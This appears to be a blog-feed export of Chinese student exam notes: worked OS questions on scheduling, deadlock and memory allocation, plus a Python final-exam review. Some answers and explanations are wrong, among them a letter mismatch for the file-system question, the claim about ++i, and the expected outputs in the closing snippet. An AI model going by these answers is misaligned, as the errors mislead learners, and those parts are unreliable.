<li><p>某基于动态分区存储管理的计算机，其主存容量为55MB (初始为空闲)，采用最佳适配(Best Fit)算法，分配和释放的顺序为 ： 分配15MB ，分配30MB，释放15MB，分配8MB，分配6MB ，此时主存中最大空闲分区的大小是()<br>解析：<br>最佳适应算法（BF）：每次为作业分配内存时总是把能满足要求又是最小的空闲分区分配给作业。<br>其主存容量为55mb(初试为空间)，<br>第一步分配15MB以后还有55MB－15MB＝40MB，<br>第二步分配30MB以后还有 40MB－30MB＝10MB，<br>第三步释放15MB以后有两个空闲区15MB，10MB，<br>第四步分配8MB，则空闲区为15MB，2MB，<br>第五步分配 6MB，则空闲区为9MB，2MB。<br>答案：9MB，选B</p>
</li>
<li><p>设计批处理多道系统时，首先要考虑的是（）<br>解析：<br>多道批处理系统：<br>优点：资源利用率大幅提升，系统吞吐量增大<br>缺点：用户响应时间长，没有交互功能。<br>答案：系统效率和吞吐量，选B</p>
</li>
<li><p>进程调度的对象和任务分别是（）<br>解析：<br>CPU调度与执行的基本对象应该为线程。而不是作业。没有从后备作业中选定调度策略上CPU这种说法，进程应该是从就绪状态通过分配内存并调度进入CPU执行状态的。<br>答案：进程，从就绪队列中按一定的调度策略选择一个作业占用CPU。 选C</p>
</li>
<li><p>一种既有利于短小作业又兼顾到长作业的作业调度算法是（）<br>解析：<br>最高响应比优先算法等待时间相同时，要求服务时间愈短，优先权愈高，因而该算法有利于短作业；<br>对于长作业，作业的优先级可以随等待时间的增加而提高，当其等待时间足够长时，其优先级便可升到很高，从而获得处理机。<br>因此该算法即有利于短作业又兼顾到了长作业。<br>答案：最高响应比优先，选C</p>
</li>
<li><p>两个进程合作完成任务。在并发执行中，一个进程要等待其合作伙伴发来消息，或者建立某个条件后再向前执行，这种制约性合作关系被称为进程的（）<br>解析：<br>进程的同步（Synchronization）是解决进程间协作关系( 直接制约关系) 的手段。<br>进程同步指两个以上进程基于某个条件来协调它们的活动。一个进程的执行依赖于另一个协作进程的消息或信号，当一个进程没有得到来自于另一个进程的消息或信号时则需等待，直到消息或信号到达才被唤醒。<br>直接制约关系：指一个进程执行完后，另一个进程才能开始，否则不能开始。<br>答案：同步，选B</p>
</li>
<li><p>当每类资源只有一个个体时，下列说法不正确的是（）<br>A 有环必死锁 	B 死锁必有环 	C 有环不一定死锁 		D 被锁者一定全在环中<br>解析：<br>当每个资源类型只有一个实例，则有环等价于死锁。<br>当存在资源类型有多个实例，则死锁必有环，有环不一定死锁。<br>答案：选C</p>
</li>
<li><p>在现代操作系统中引入了（），从而使并发和共享成为了可能。<br>答案：多道程序，选D</p>
</li>
<li><p>设有3个作业，它们同时到达，运行时间分别为T1，T2和T3，且T1≤T2≤T3，若它们在单处理机系统中按单道运行，采用短作业优先调度算法，则平均周转时间为（）<br>解析：<br>周转时间是：程序从进入系统到完成的时间总量<br>因为是单道的，所以只能一个一个地执行，又是按照最短时间优先执行，因此，执行T1花费总时间是T1,执行T2花费总时间是T1+T2(T1是等待的时间)，执行T3花费的总时间是T1+T2+T3,(T1+T2)是等待的时间，故而，总的平均周转时间是三者之和除以三。<br>答案：T3/3+2*T2/3+T1，选D</p>
</li>
<li><p>若系统中有五台绘图仪，有多个进程均需要使用两台，规定每个进程一次仅允许申请一台，则至多允许（）个进程参与竞争，而不会发生死锁。<br>解析：<br>4个进程，当5个进程的时候如果都同时申请到了1台，就发生死锁了。如果是4个进程，那必然有一个能申请到2台，使资源能够得到释放。<br>答案：4，选D</p>
</li>
<li><p>CPU输出数据速度远远高于打印机的打印速度，为解决矛盾，可采用（）<br>解析：<br>覆盖技术和虚拟技术主要是解决内存不足的问题，当有大文件、程序需要在内存处理时，可以用到覆盖技术和虚拟技术，并行技术主要用于多核的 CPU 或者多 IO 总线上并行处理。<br>答案：缓冲技术，选B</p>
</li>
<li><p>为了允许不同用户的文件具有相同的文件名，通常在文件系统中采用（）<br>答案：多级目录，选B</p>
</li>
<li><p>在可变分区存储管理中，最优适应分配算法要求对空闲区表项按（）排列<br>解析：</p>
</li>
</ol>
<ul>
<li>首次适应算法：按照首址递增的方式来排序。这种方式的特点是：当用户查找空闲区表时，他是从低地址空间开始查找的，所以他是尽可能地先使用低地址空间。但需要较大分区时在高地址空间有较大的满足可能性。</li>
<li>最佳适应法：按照大小递增的方式排序。这种方法的特点是：尽可能地先使用较小的空闲区，保留较大的空闲区。当需要较大分区时有较大的满足可能性。</li>
<li>最坏适应法：空闲区表按大小递减排序。尽可能地先使用较大的空闲区，大空闲区分割后剩下部分还是很大，还能装下较大的程序。所以最坏适应法未必最坏。仅作一次查找就可以找到所要分区。<br>因此在最有适应分配算法中对空闲区表项是按照尺寸从小到大进行排序的。<br>答案：尺寸从小到大，选C</li>
</ul>
<ol start="18">
<li><p>支持程序浮动地址转换机制是（）<br>解析：<br>主存储器是可以被处理器直接访问的，处理器是按绝对地址访问主存储器的。<br>为了使用户编制的程序能存放在主存储器的任意区域执行，用户使用逻辑地址编辑程序，即用户使用了逻辑上的主存储器。<br>存储管理必须为用户分配一个物理上的存储空间，于是，就有一个从逻辑空间到物理空间的转换问题。<br>具体地说，是要把逻辑地址转换成绝对地址，把这样的地址转换工作称为重定位。<br>重定位的方式可以有“静态重定位”和“动态重定位”。<br>静态重定位是指在装入一个作业时，把作业中的指令地址和数据地址全部转换成绝对地址。一旦装入则不能改变。<br>动态重定位是指在装入作业时，不进行地址转换，而是直接把作业装入到分配的主存区域中。在作业执行过程中，每当执行一条指令时都有硬件的地址转换机构将指令中的逻辑地址转换为绝对地址。<br>答案：动态重定位，选A</p>
</li>
<li><p>在可变式分区分配方案中，某一作业完成后，系统收回其主存空间，并与相邻空闲区合并，为此需修改空闲区表，造成空闲区数减1的情况是（）<br>解析：<br>无上邻空闲区，也无下邻空闲区：这时应该是空闲区数加 1<br>有上邻空闲区，但无下邻空闲区；有下邻空闲区，但无上邻空闲区：这时空闲区数不变<br>有下邻空闲区，也有上邻空闲区：这时空闲区数减 1<br>答案：有下邻空闲区，也有上邻空闲区。选D</p>
</li>
<li><p>在下面关于虚拟存储器的叙述中，正确的是（）<br>A 要求程序运行前必须全部装入内存且在运行过程中一直驻留在内存<br>B 要求程序运行前不必全部装入内存且在运行过程中不必一直驻留在内存<br>C 要求程序运行前不必全部装入内存但是在运行过程中必须一直驻留在内存<br>D 要求程序运行前必须全部装入内存但在运行过程中不必一直驻留在内存<br>解析：<br>虚拟存储器基于局部性原理，在程序运行时，可以将程序的一部分装入内存，而将其余部分留在外存，就可以启动程序执行。在程序执行过程中，当访问的信息不在内存时，由操作系统将所需的部分调入内存，然后继续执行。另一方面，操作系统将内存中暂时不使用的内容换出到外存上，从而腾出空间存放将要调入的信息。<br>答案：选B</p>
</li>
<li><p>文件系统中用（）管理文件。<br>解析：<br>文件系统属于操作系统中的一个重要组成部分，负责信息的组织、存储和访问，提供高效快速和方便访问功能。操作系统以文件方式管理计算机软件资源和被管理的文件和数据结构（目录、索引表等）的集合<br>选项A：进程控制块 用来管理进程，如程序计数器、进程状态、CPU暂存器、CPU排班法、存储器管理、输入输出状态等。<br>选项B：目录 实现文件的按名存取管理，系统中保存了海量文件需要组织管理，磁盘可以分为若干个分区，每个分区都包含了存储在分区中的文件的信息，这些信息保存在设备目录中。<br>选项C：外页表 是虚页号与实际地址的对应表，主要功能是实现虚地址到实地址的转化。<br>选项D：软硬件结合的方法 是笼统的计算机硬件和软件的结合，和本题意不太符合。<br>答案：目录，选D</p>
</li>
<li><p>在多进程的并发系统中，肯定不会因竞争（）而产生死锁。<br>解析：</p>
</li>
</ol>
<ul>
<li>竞争资源引起进程死锁<br>当系统中供多个进程共享的资源如打印机、公用队列的等，其数目不足以满足诸进程的需要时，会引起诸进程对资源的竞争而产生死锁。 </li>
<li>可剥夺资源和不可剥夺资源<br>系统中的资源可以分为两类，一类是可剥夺资源，是指某进程在获得这类资源后，该资源可以再被其他进程或系统剥夺。例如，优先权高的进程可以剥夺优先权低的进程的处理机。又如，内存区可由存储器管理程序，把一个进程从一个存储区移到另一个存储区，此即剥夺了该进程原来占有的存储区，甚至可将一进程从内存调到外存上，可见，CPU和主存均属于可剥夺性资源，<strong>可剥夺资源不会产生死锁</strong>。另一类资源是不可剥夺资源，当系统把这类资源分配给某进程后，再不能强行收回，只能在进程用完后自行释放，如磁带机、打印机等。</li>
<li>竞争不可剥夺资源<br>在系统中所配置的不可剥夺资源，由于它们的数量不能满足诸进程运行的需要，会使进程在运行过程中，因争夺这些资源而陷于僵局。例如，系统中只有一台打印机R1和一台磁带机R2，可供进程P1和P2共享。假定PI已占用了打印机R1，P2已占用了磁带机R2，若P2继续要求打印机R1，P2将阻塞；P1若又要求磁带机，P1也将阻塞。于是，在P1和P2之间就形成了僵局，两个进程都在等待对方释放自己所需要的资源，但是它们又都因不能继续获得自己所需要的资源而不能继续推进，从而也不能释放自己所占有的资源，以致进入死锁状态。 </li>
<li>竞争临时资源<br>上面所说的打印机资源属于可顺序重复使用型资源，称为永久资源。还有一种所谓的临时资源，这是指由一个进程产生，被另一个进程使用，短时间后便无用的资源，故也称为消耗性资源，如硬件中断、信号、消息、缓冲区内的消息等，它也可能引起死锁。例如，SI，S2，S3是临时性资源，进程P1产生消息S1，又要求从P3接收消息S3；进程P3产生消息S3，又要求从进程P2处接收消息S2；进程P2产生消息S2，又要求从P1处接收产生的消息S1。如果消息通信按如下顺序进行：<br>P1: ···Relese（S1）；Request（S3）； ···<br>P2: ···Relese（S2）；Request（S1）； ···<br>P3: ···Relese（S3）；Request（S2）； ···<br>并不可能发生死锁。但若改成下述的运行顺序：<br>P1: ···Request（S3）；Relese（S1）；···<br>P2: ···Request（S1）；Relese（S2）； ···<br>P3: ···Request（S2）；Relese（S3）； ···<br>则可能发生死锁。</li>
<li>进程推进顺序不当引起死锁<br>由于进程在运行中具有异步性特征，这可能使P1和P2两个进程按下述两种顺序向前推进。<br>1） 进程推进顺序合法<br>当进程P1和P2并发执行时，如果按照下述顺序推进：P1：Request（R1）； P1：Request（R2）； P1: Relese（R1）；P1: Relese（R2）； P2：Request（R2）； P2：Request（R1）； P2: Relese（R2）；P2: Relese（R1）；这两个进程便可顺利完成，这种不会引起进程死锁的推进顺序是合法的。<br>2） 进程推进顺序非法<br>若P1保持了资源R1,P2保持了资源R2，系统处于不安全状态，因为这两个进程再向前推进，便可能发生死锁。例如，当P1运行到P1：Request（R2）时，将因R2已被P2占用而阻塞；当P2运行到P2：Request（R1）时，也将因R1已被P1占用而阻塞，于是发生进程死锁。<br>答案：CPU，选C</li>
</ul>
<ol start="23">
<li><p>程序员利用系统调用打开I&#x2F;O设备时，通常使用的设备标识（）<br>解析：<br>设备管理具有设备独立性的特点，操作系统以系统调用方式来请求某类设备时，使用的是逻辑设备名。而在程序实际执行时，将逻辑设备名转换为对应的物理设备名。<br>答案：逻辑设备名，选D</p>
</li>
<li><p>分段存储管理系统中，地址长度为32位，其中段号占8位，则段长最大（）<br>解析：<br>分段存储管理中，逻辑地址分为两部分，段号和段内位移，地址总长度为32位．段号占了8位，则剩下24位表示段内位移的，则最大段长为2^24字节。<br>答案：2^24字节，选C</p>
</li>
<li><p>设与某资源相关联的信号量初值为3，当前值为1，若M表示该资源的可用个数，N表示等待资源的进程数，则M，N分别是（）<br>解析：<br>信号量的初值表示系统中某类资源的数目，已知为3；<br>信号量的值小于等于0时，表示该类资源已分配完毕，此时信号量的绝对值表示在该信号量链表中已阻塞进程的数目。<br>信号量的值大于0时，表示该类资源还没有完全分配完，此时信号量的值表示该资源的可用个数。<br>信号量的当前值为1，大于0，则M表示该资源的可用个数为1，N表示等待资源的进程数为0。<br>答案：1，0  选A</p>
</li>
<li><p>某计算机系统中有8台打印机，有K个进程竞争使用，每个进程最多需要3台打印机。该系统可能会发生死锁的K的最小值（）<br>解析：<br>由于每个进程最多需要3台打印机，总共有8台打印机。<br>当有3个进程竞争使用时，每个进程能分配打印机数分别为3，3，2。有进程能释放资源，不会发生死锁。<br>当有4个进程竞争使用时，每个进程能分配2台打印机，不足以释放资源，即发生死锁。<br>因此最小值为4。<br>总结：用系统资源n-1除以进程最多需要的资源数m-1得到的结果向下取整的结果为不发生死锁的最大进程数。<br>答案：4，选C</p>
</li>
<li><p>设文件F1当前引用计数值为1，先建立F1的符号链接文件F2，再建立F1的硬链接文件F3，然后删除F1。此时F2和F3的引用计数值分别是（）<br>解析：<br>硬链接，同时改变源文件和链接文件连接数（+1），其实是同一个文件，文件类型是普通文件。<br>软链接，也叫符号链接，创建新的链接文件，文件类型，链接文件（l），是一个全新的文件，相当于快捷方式，不改变源文件链接数。<br>答案：1，1。选C</p>
</li>
<li><p>当进程因时间片用完而让出处理机时，该进程应转变为（）状态。<br>解析：<br><strong>进程调度的时机</strong><br>进程调度发生的时机（也称为调度点）与进程的状态变化有直接的关系。回顾进程状态变化图，我们可以看到进程调度的时机直接与进程在运行态&lt;--&gt;退出态&#x2F;就绪态&#x2F;阻塞态的转变时机相关。简而言之，引起进程调度的时机可归结为以下几类：</p>
</li>
</ol>
<ul>
<li>正在执行的进程执行完毕，需要选择新的就绪进程执行。</li>
<li>正在执行的进程调用相关系统调用（包括与I/O操作，同步互斥操作等相关的系统调用）导致需等待某事件发生或等待资源可用，从而将白己阻塞起来进入阻塞状态。</li>
<li>正在执行的进程主动调用放弃CPU的系统调用，导致自己的状态为就绪态，且把自己重新放到就绪队列中。</li>
<li>等待事件发生或资源可用的进程等待队列，从而导致进程从阻塞态回到就绪态，并可参与到调度中。</li>
<li>正在执行的进程的时间片已经用完，致自己的状态为就绪态，且把自己重新放到就绪队列中。</li>
<li>在执行完系统调用后准备返回用户进程前的时刻，可调度选择一新用户进程执行</li>
<li>就绪队列中某进程的优先级变得高于当前执行进程的优先级，从而也将引发进程调度。</li>
<li>有序列表内容<br>答案：就绪，选B</li>
</ul>
<ol start="29">
<li><p>文件的保密是指防止文件被（）<br>解析：<br>文件的保护:防止文件被破坏。<br>文件的保密:防止文件被窃取。<br>答案：窃取，选C</p>
</li>
<li><p>为了允许不同用户的文件具有相通的文件名，通常在文件系统中采用（）<br>答案：多级目录，选B</p>
</li>
</ol>
]]></content>
      <categories>
        <category>OS</category>
        <category>习题</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>Python期末专题</title>
    <url>/2022/11/13/Python%E6%9C%9F%E6%9C%AB%E4%B8%93%E9%A2%98/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当撰写这篇Python复习专题的时候，距离期末考试仅剩3天。<br>我啊，真是堕落。&#x2F;(ㄒoㄒ)&#x2F;~~<br>本篇复习主要以两次测试以及题库为主，其它作为补充。</p>
<span id="more"></span>

<h1 id="概念题"><a href="#概念题" class="headerlink" title="概念题"></a>概念题</h1><ol>
<li>id()函数</li>
</ol>
<ul>
<li>定义和用法<br>id() 函数返回指定对象的唯一 id。<br>Python 中的所有对象都有其自己的唯一 id。<br>id 在创建时已分配给对象。<br>id 是对象的内存地址，并且在每次运行程序时都不同。（除了某些具有恒定唯一 id 的对象，比如 -5 到 256 之间的整数</li>
<li>语法<br>id(object)</li>
</ul>
<ol start="2">
<li><p>Python是一种<strong>跨平台</strong>的，是一个高层次的结合了<strong>解释性</strong>、<strong>编译性</strong>、<strong>互动性</strong>和<strong>面向对象</strong>的<strong>脚本</strong>语言</p>
</li>
<li><p>python序列</p>
</li>
</ol>
<ul>
<li>有序序列包括： <strong>列表 元组 字符串</strong></li>
<li>无序序列包括： <strong>字典 集合 控制集合数据的对象</strong></li>
</ul>
<ol start="4">
<li><p>python程序的扩展名<br>.py是<strong>源文件扩展名</strong><br>.pyw是另一种<strong>源文件扩展名</strong>  主要用于GUI程序发布时不需要看到控制台信息的情况<br>.pyc是<strong>源文件编译后的文件</strong><br>.pyo是<strong>源文件优化编译后的文件</strong><br>.pyd是<strong>其他语言写的python库</strong></p>
</li>
<li><p>Python注释</p>
</li>
</ol>
<ul>
<li>单行注释 #</li>
<li>多行注释(不一定是注释，有时可作为字符串存在)<br>单引号 <code>&#39;&#39;&#39;</code><br>双引号 <code>&quot;&quot;&quot;</code></li>
</ul>
<ol start="6">
<li><p>Python 变量名区分大小写<br>例如：Cuit和cuit是两个变量名</p>
</li>
<li><p>非面向对象的程序设计语言是<br>C语言  汇编语言</p>
</li>
<li><p>使用上下文管理关键字<strong>with</strong>可以自动管理文件对象，不论何种原因结束该关键字中的语句块，都能保证文件被正确关闭</p>
</li>
<li><p>Python3 中有六个标准的数据类型：</p>
</li>
</ol>
<ul>
<li>Number（数字）  支持 int、float、bool、complex（复数）</li>
<li>String（字符串）</li>
<li>List（列表）</li>
<li>Tuple（元组）</li>
<li>Set（集合）</li>
<li>Dictionary（字典）</li>
</ul>
<ol start="10">
<li><p>Python中的关系运算符可以连续使用<br>如：6&lt; a &lt;10</p>
</li>
<li><p>Python 3.x 中可以使用中文作为变量名</p>
</li>
<li><p>生成器推导式比列表推导式具有更高的效率，推荐使用</p>
</li>
<li><p>Python编程中，提示符“&gt;&gt;&gt;”表示 交互式编程模式</p>
</li>
<li><p>Python不允许使用<strong>关键字</strong>作为变量名，允许使用<strong>内置函数名</strong>作为变量名，但这会改变函数名的定义</p>
</li>
<li><p>Python中相同的值在内存中的保存</p>
</li>
</ol>
<ul>
<li>对于[-5, 256]之间的整数，会在内存中进行缓存，任何时刻在内存中只有一份</li>
<li>同一个列表或元组中的大整数在内存中会保存一份</li>
<li>对于实数，不进行缓存。一样的实数，在内存中也不是一份</li>
<li>对于字符串，是否进行缓存，并不是单纯地看长度</li>
</ul>
<ol start="16">
<li><p>对于带有else子句的for循环和while循环，当循环因循环条件不成立而自然结束时会执行else中的代码</p>
</li>
<li><p>通过对象可以调用<strong>类方法</strong>和<strong>静态方法</strong></p>
</li>
<li><p>Python使用<strong>class</strong>关键字来定义类</p>
</li>
<li><p>在函数内部可以通过关键字<strong>global</strong>来定义全局变量</p>
</li>
<li><p>Python中，关于类中的构造函数 创建时自动调用</p>
</li>
<li><p>Python 函数返回值</p>
</li>
</ol>
<ul>
<li>函数体中 return 语句有指定返回值时返回的就是其值</li>
<li>函数体中没有 return 语句时，函数运行结束会隐含返回一个 None 作为返回值，类型是 NoneType，与 return 、return None 等效，都是返回 None</li>
</ul>
<ol start="22">
<li><p>在类的定义中，以两个下划线“__”开始（不以两个或者更多下划线结尾）定义的成员方法是<strong>私有</strong>方法</p>
</li>
<li><p>在Python中定义类时所有实例方法的第一个参数用来表示对象本身，在类的外部通过对象名来调用实例方法时不需要为该参数传值</p>
</li>
<li><p>通过类名修改类属性的值，会影响所有的实例化对象</p>
</li>
<li><p>自定义函数时，即使该函数不需要接收任何参数，也必须在函数名后保留一对空的圆括号来表示这是一个函数</p>
</li>
<li><p>Python 数据成员(属性)</p>
</li>
</ol>
<ul>
<li>属于对象的数据成员一般在构造方法__init__()中定义，当然也可以在其他成员方法中定义，在定义和在实例方法中访问数据成员时<strong>以self作为前缀</strong>，同一个类的不同对象（实例）的数据成员之间互不影响</li>
<li>属于类的数据成员是该类所有对象共享的，不属于任何一个对象，在定义类时这类数据成员一般不在任何一个成员方法的定义中</li>
</ul>
<ol start="27">
<li>Python函数的参数</li>
</ol>
<ul>
<li>位置参数(positional argument)<br>位置参数也称必须参数，位置参数须以从左到右的顺序传入函数。调用时的数量必须和声明时的一样</li>
<li>关键字参数(keyword argument)<br>在调用函数时，实参可以是key&#x3D;value的形式，称为关键字参数<br>可以不按照从左到右的顺序定义，但仍能为指定的形参赋值<br>关键字参数在位置参数后面。位置参数是必须先满足，才考虑其他可变参数<br>不可以对一个形参重复赋值</li>
<li>默认参数<br>默认参数必须在位置参数之后</li>
<li>不定长参数<br>当需要一个函数能处理比当初声明时更多的参数，则这些参数叫做不定长参数</li>
</ul>
<ol start="28">
<li><p>以读模式打开文件时，文件指针指向文件开始处</p>
</li>
<li><p>函数内部定义的局部变量当函数调用结束后被自动删除</p>
</li>
<li><p>语句<strong>pass</strong>仅起到占位符的作用，并不会做任何操作</p>
</li>
<li><p>Python支持在函数内部定义函数，此类函数又称为<strong>局部</strong>函数</p>
</li>
<li><p>python中的*(星号)</p>
</li>
</ol>
<ul>
<li>作为乘法运算符</li>
<li>收集列表中多余的值</li>
<li>函数中收集参数或者分配参数</li>
</ul>
<ol start="33">
<li><p>对文件进行读写操作之后必须显式关闭文件以确保所有内容都得到保存</p>
</li>
<li><p>python编程语言中，函数可以不包含 return 语句</p>
</li>
<li><p>在类中，采用@和关键字<strong>classmethod</strong>修饰的方法为类方法</p>
</li>
<li><p>Python内置函数<strong>open</strong>用来打开或创建文件并返回文件对象</p>
</li>
<li><p>类的数据成员，一种是<strong>类属性</strong>，另一种是<strong>实例</strong>属性</p>
</li>
<li><p>Python类方法和实例方法相似，它最少也要包含一个参数，只不过类方法中通常将其命名为<strong>cls</strong></p>
</li>
<li><p>Python 支持多继承，如果父类中有相同的方法名，而在子类中调用时没有指定父类名，则 Python 解释器将从左向右按顺序进行搜索</p>
</li>
<li><p>使用 pickle 进行序列化得到的二进制文件使用 struct <strong>不可以</strong>正确地进行反序列化</p>
</li>
<li><p>Python文件基本操作方法</p>
</li>
</ol>
<ul>
<li>open()  read()  write()  close()</li>
<li>readline() 一次读取一行</li>
<li>append()<strong>不是！</strong></li>
<li>详细：<a href="https://www.w3cschool.cn/article/25704283.html">Python文件基本操作整理</a></li>
</ul>
<ol start="42">
<li>Python文件打开的合法模式组合</li>
</ol>
<ul>
<li>r&#x2F;rt  默认模式，文本模式读</li>
<li>rb	二进制文件</li>
<li>w&#x2F;wt 	文本模式写，打开前文件存储被清空</li>
<li>wb    二进制写，文件存储同样被清空</li>
<li>a   	追加模式，只能写在文件末尾</li>
<li>a+  	可读写模式，写只能写在文件末尾</li>
<li>w+ 	可读写，与a+的区别是要清空文件内容</li>
<li>r+   	可读写，与a+的区别是可以写到文件任何位置</li>
</ul>
<ol start="43">
<li>Python成员方法</li>
</ol>
<ul>
<li>公有方法  默认都是公有的方法</li>
<li>私有方法  以两个下划线”__“开始声明私有方法</li>
<li>静态方法  使用staticmethod()方法声明静态方法</li>
<li>类方法    使用classmethod()方法声明类方法</li>
</ul>
<ol start="44">
<li><p>Python编程语言中，可以动态地为类和对象增加成员</p>
</li>
<li><p>为了提高Python代码运行速度和进行适当的保密，可以将Python程序文件编译为扩展名<strong>pyc</strong>的文件</p>
</li>
<li><p>可以使用内置函数**globals()**查看包含当前作用域内所有全局变量和值的字典</p>
</li>
<li><p>可以使用内置函数**locals()**查看包含当前作用域内所有局部变量和值的字典</p>
</li>
<li><p>字典对象的**get()**方法可以获取指定“键”对应的“值”，并且可以在指定“键”不存在的时候返回指定值，如果不指定则返回 None</p>
</li>
<li><p>字典对象的**items()**方法返回字典中的“键-值对”列表</p>
</li>
<li><p>Python 标准库 random 中的**choice()**方法作用是从序列中随机选择1个元素</p>
</li>
<li><p>Python 标准库 random 中的sample(seq, k)方法作用是从序列中选择<strong>不重复</strong>的k个元素</p>
</li>
<li><p>random模块中**shuffle()**方法的作用是将列表中的元素随机乱序</p>
</li>
<li><p>在设计正则表达式时，字符**?**紧随任何其他限定符(*、+、?、{n}、{n,}、{n,m})之后时，匹配模式是“非贪心的”，匹配搜索到的、尽可能短的字符串</p>
</li>
<li><p>在Python定义类时，与运算符“**”对应的特殊方法名为:</p>
</li>
</ol>
<p><code>__pow__()</code></p>
<ol start="55">
<li>在Python中定义类时，与运算符“&#x2F;&#x2F;”对应的特殊方法名为:</li>
</ol>
<p><code>__floordiv__()</code></p>
<ol start="56">
<li>在Python中，不论类的名字是什么，构造方法的名字都是:</li>
</ol>
<p><code>__init__()</code></p>
<ol start="57">
<li><p>如果在设计一个类时实现了__contains__()方法，那么该类的对象会自动支持<strong>in</strong>运算符</p>
</li>
<li><p>对文件进行写入操作之后，**flush()**方法用来在不关闭文件对象的情况下将缓冲区内容写入文件</p>
</li>
<li><p>Python标准库os中用来列出指定文件夹中的文件和子文件夹列表的方式是<strong>listdir()</strong></p>
</li>
<li><p>Python标准库<strong>hashlib</strong>中提供了计算MD5摘要的方法md5()</p>
</li>
</ol>
<h1 id="选填判断题"><a href="#选填判断题" class="headerlink" title="选填判断题"></a>选填判断题</h1><ol>
<li><p><code>x = &#123;1:1, 2:2&#125;</code>，之后执行<code>x.update(&#123;2:3, 3:3&#125;)</code>，则<code>sorted(x.items())</code>值为：<br>[(1, 1), (2, 3), (3, 3)]<br>解析：<br>执行update函数后，x&#x3D;{1: 1, 2: 3, 3: 3}<br>由于items()方法返回一个 view 对象。这个视图对象包含字典的键值对，形式为列表中的元组。<br>因此可得到该结果。</p>
</li>
<li><p>判断：正则表达式’^abc’只能匹配所有以’abc’开头的字符串<br>对</p>
</li>
<li><p>判断：表达式1&lt;2 or a&lt;b的值为异常报错，因为a,b没有被定义<br>错<br>解析：<br>运行后不会产生报错。因为是惰性求值，or语句的前半判断正确，后半则不会运算</p>
</li>
<li><p>在Python编程语言中，已知i&#x3D;4，++i的值为：<br>4<br>解析：<br>++i 表示先输出再作 + 运算</p>
</li>
<li><p>int(‘101’, 2)的值是：<br>5<br>解析：<br>int()的语法 <code>class int(x, base=10)</code><br>参数：x -- 字符串或数字  base -- 进制数，默认十进制<br>该题是将前面的字符串’101’当作二进制，转换成十进制即为5</p>
</li>
<li><p><code>x = [&#39;321&#39;, &#39;0234&#39;, &#39;9&#39;,&#39;99&#39;],max(x, key=len)</code>结果是：<br>‘0234’<br>解析：<br>max()函数是从中选出最大值，key&#x3D;len意思是按长度排序，因此结果’0234’</p>
</li>
<li><p>判断：已知 x &#x3D; ‘cuit’，那么赋值语句 x &#x3D; 3 由于赋值类型不一致，导致该语句是无法正常执行的<br>错<br>解析：<br>可以正常执行，能够赋值成功</p>
</li>
<li><p>已知<code>x = [[None] * 2] * 2</code>,那么<code>x[0][0]=1</code>后，x的值为：<br>[[1, None], [1, None]]<br>解析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x=[[None] * 2] </span><br></pre></td></tr></table></figure>
<p>值为[[None, None]]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x = [[None] * 2] * 2 </span><br></pre></td></tr></table></figure>
<p>值为[[None, None], [None, None]]<br>外面的 * 2 是完全复制，内存id相同，因此赋值时<code>x[0][0],x[1][0]</code>均为1<br>内部的 * 2 是部分复制，内存id不同，因此赋值时<code>x[0][1],x[1][1]</code>仍然是None</p>
</li>
<li><p>表达式’a,,,bb,,ccc’.split(‘,’)的运行结果是：<br>[‘a’, ‘’, ‘’, ‘bb’, ‘’, ‘ccc’]<br>解析：<br>按照’,’切分字符串，由于该字符串两个’,’之间为空，所以最终会得到’’的字符串</p>
</li>
<li><p>已知 x 为非空字符串，那么表达式 <code>&#39;,&#39;.join(x.split(&#39;,&#39;)) == x</code> 的值一定为 True<br>对</p>
</li>
<li><p>语句<code>x.append(3)</code>和<code>x = x+[3]</code>，都是原地修改列表x,在列表x尾部添加元素3<br>错<br>解析：<br>append()函数是在列表尾部添加元素3，<code>x = x+[3]</code>是重新创建一个列表，把元素3添加进去，再赋值给x</p>
</li>
<li><p>表达式<code>&#123;1, 2, 3, 4, 5, 6&#125; ^ &#123;5, 6, 7, 8&#125;</code>的值为:<br>{1, 2, 3, 4, 7, 8}<br>解析：<br>集合运算符号’^’是剔除两个集合相同元素后得到新集合。<br>更多集合运算知识：<a href="https://www.runoob.com/python3/python3-set.html">Python3 集合</a></p>
</li>
<li><p>str((1,2,3))的返回值是:<br>‘(1,2,3)’<br>解析：<br>不要忘加外面的引号，单引双引皆可</p>
</li>
<li><p>正则表达式r’p*‘表示允许匹配多个(至少1个)p<br>错<br>解析：<br>*表示匹配前⼀个字符出现0次或者⽆限次，即可有可⽆</p>
</li>
<li><p>对象<code>x=（1,2,3)</code>,语句<code>x[0]=10</code>，表示修改对象x第一个元素的值<br>错<br>解析：<br>元组对象不支持元素修改，因为是不可变类型</p>
</li>
<li><p>表达式 [] &#x3D;&#x3D; None 的值为 True<br>错<br>解析<br>值为False。 None表示空，但它不等于空字符串、空列表，也不等同于False</p>
</li>
<li><p>“aassadfddff”.strip(“af”)的结果是：<br>ssadfdd<br>解析：<br>该正则表达式strip意为将前面字符串首尾包含括号内字符的切掉。<br>如果是lstrip 切掉左边的<br>如果是rstrip 切掉右边的</p>
</li>
<li><p>已知<code>x = [300, 300, 300]，x[0] is x[1]</code>的值为True<br>对<br>解析：<br>is运算符判断两者id是否相同。本题中，同一列表中值相同的元素id相同</p>
</li>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x=<span class="built_in">input</span>(<span class="string">&#x27;input ten number:&#x27;</span>)<span class="comment">#输入的分别是3 4 2 3 17 4 21 18 19 22</span></span><br><span class="line">a_list = <span class="built_in">list</span>(<span class="built_in">map</span>( <span class="keyword">lambda</span> x:<span class="built_in">int</span>(x),x.split(<span class="string">&#x27; &#x27;</span>))<span class="comment">#期望 a_lis为: [3,4,2,3,17,4,21,18,19,22]；注意上一行x中有空格</span></span><br><span class="line"><span class="built_in">print</span>(a_list[-<span class="number">6</span>:-<span class="number">1</span>])<span class="comment">#期望输出[4,21,18,19,22]</span></span><br><span class="line"><span class="built_in">print</span>(a_list.remove(<span class="number">3</span>))<span class="comment">#期望输出[4,2,3,17,4,21,18,19,22]</span></span><br><span class="line"><span class="built_in">print</span>( <span class="built_in">len</span>(a_list))<span class="comment">#期望显示a___list元素个数</span></span><br></pre></td></tr></table></figure>
